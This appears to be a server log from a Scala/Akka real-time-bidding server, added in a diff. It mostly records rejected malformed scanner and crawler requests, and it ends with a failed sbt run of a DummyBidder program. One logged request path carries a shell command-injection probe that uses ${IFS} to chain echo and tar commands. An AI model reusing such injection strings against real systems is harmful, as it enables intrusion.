+[WARN] [2016-11-04 23:12:09,566] [rtb-server-akka.actor.default-dispatcher-19] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-05 01:15:18,512] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Accept: */*, User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-05 16:35:35,342] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-05 16:35:36,328] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-06 08:27:11,790] [rtb-server-akka.actor.default-dispatcher-20] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-06 16:39:07,099] [rtb-server-akka.actor.default-dispatcher-6] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request-target, unexpected character '{' at position 18: 
+/language/Swedish${IFS}&&echo${IFS}610cker>qt&&tar${IFS}/string.js
+                  ^
+
+[WARN] [2016-11-07 12:05:55,251] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-07 18:14:41,583] [rtb-server-akka.actor.default-dispatcher-20] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/login.asp,List(Connection: close),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-08 00:56:02,373] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-08 00:56:02,538] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(OPTIONS,/,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-08 00:56:02,702] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-11-08 00:56:02,867] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/nice%20ports,/Trinity.txt.bak,List(),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[WARN] [2016-11-08 00:56:03,032] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  ? 
+googl
+[WARN] [2016-11-08 00:56:13,376] [rtb-server-akka.actor.default-dispatcher-20] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (r?       
+[WARN] [2016-11-08 00:56:13,539] [rtb-server-akka.actor.default-dispatcher-20] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:           v
+[WARN] [2016-11-08 00:56:26,365] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   S  O ?G???
+[WARN] [2016-11-08 00:56:26,530] [rtb-server-akka.actor.default-dispatcher-17] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    qj?n0?k??
+[WARN] [2016-11-08 00:56:26,693] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:    ??SMBr    @
+[WARN] [2016-11-08 00:56:42,101] [rtb-server-akka.actor.default-dispatcher-21] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-11-08 00:56:42,266] [rtb-server-akka.actor.default-dispatcher-2] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: TNMP   TNME   
+[WARN] [2016-11-08 00:56:47,511] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: DmdT          
+[WARN] [2016-11-08 00:56:47,674] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: :   /     @ 
+[WARN] [2016-11-08 00:56:47,838] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:   ?????   MMS
+[WARN] [2016-11-08 00:56:48,005] [rtb-server-akka.actor.default-dispatcher-5] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:  Z     6,   
+[WARN] [2016-11-08 00:56:48,171] [rtb-server-akka.actor.default-dispatcher-9] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method:              
+[WARN] [2016-11-08 01:08:44,937] [rtb-server-akka.actor.default-dispatcher-8] s.c.s.HttpServerConnection: Illegal request, responding with status '501 Not Implemented': Unsupported HTTP method: ?  (>=       
+[WARN] [2016-11-08 12:25:05,934] [rtb-server-akka.actor.default-dispatcher-4] s.c.s.HttpServerConnection: Illegal request, responding with status '505 HTTP Version Not Supported': The server does not support the HTTP protocol version used in the request.
+[WARN] [2016-11-08 23:05:42,352] [rtb-server-akka.actor.default-dispatcher-13] s.c.s.HttpServerConnection: Illegal request, responding with status '400 Bad Request': Illegal request: Cannot establish effective request URI of HttpRequest(GET,/,List(Connection: close, User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)),Empty,HTTP/1.0), request has a relative URI and is missing a `Host` header
+[0m[[0minfo[0m] [0mLoading project definition from /root/dummy-responser/project[0m
+[0m[[0minfo[0m] [0mSet current project to dummy-responser (in build file:/root/dummy-responser/)[0m
+[0m[[0minfo[0m] [0mRunning DummyBidder [0m
+Enter number of virtual bidders
+[0m[[31merror[0m] [0m(run-main-0) java.io.IOException: Bad file descriptor[0m
+java.io.IOException: Bad file descriptor
+	at java.io.FileInputStream.readBytes(Native Method)
+	at java.io.FileInputStream.read(FileInputStream.java:255)
+	at java.io.BufferedInputStream.read1(BufferedInputStream.java:284)
+	at java.io.BufferedInputStream.read(BufferedInputStream.java:345)
+	at sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:284)
+	at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:326)
+	at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)
+	at java.io.InputStreamReader.read(InputStreamReader.java:184)
+	at java.io.BufferedReader.fill(BufferedReader.java:161)
+	at java.io.BufferedReader.readLine(BufferedReader.java:324)
+	at java.io.BufferedReader.readLine(BufferedReader.java:389)
+	at scala.io.StdIn$class.readLine(StdIn.scala:18)
+	at scala.io.StdIn$.readLine(StdIn.scala:229)
+	at scala.io.StdIn$class.readInt(StdIn.scala:106)
+	at scala.io.StdIn$.readInt(StdIn.scala:229)
+	at DummyBidder$.delayedEndpoint$DummyBidder$1(DummyBidder.scala:15)
+	at DummyBidder$delayedInit$body.apply(DummyBidder.scala:12)
+	at scala.Function0$class.apply$mcV$sp(Function0.scala:34)
+	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12)
+	at scala.App$$anonfun$main$1.apply(App.scala:76)
+	at scala.App$$anonfun$main$1.apply(App.scala:76)
+	at scala.collection.immutable.List.foreach(List.scala:381)
+	at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:35)
+	at scala.App$class.main(App.scala:76)
+	at DummyBidder$.main(DummyBidder.scala:12)
+	at DummyBidder.main(DummyBidder.scala)
+	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+	at java.lang.reflect.Method.invoke(Method.java:498)
+[0m[[31mtrace[0m] [0mStack trace suppressed: run [34mlast compile:run[0m for the full output.[0m
+java.lang.RuntimeException: Nonzero exit code: 1
+	at scala.sys.package$.error(package.scala:27)
+[0m[[31mtrace[0m] [0mStack trace suppressed: run [34mlast compile:run[0m for the full output.[0m
+[0m[[31merror[0m] [0m(compile:[31mrun[0m) Nonzero exit code: 1[0m
+[0m[[31merror[0m] [0mTotal time: 0 s, completed Nov 9, 2016 9:16:21 AM[0m
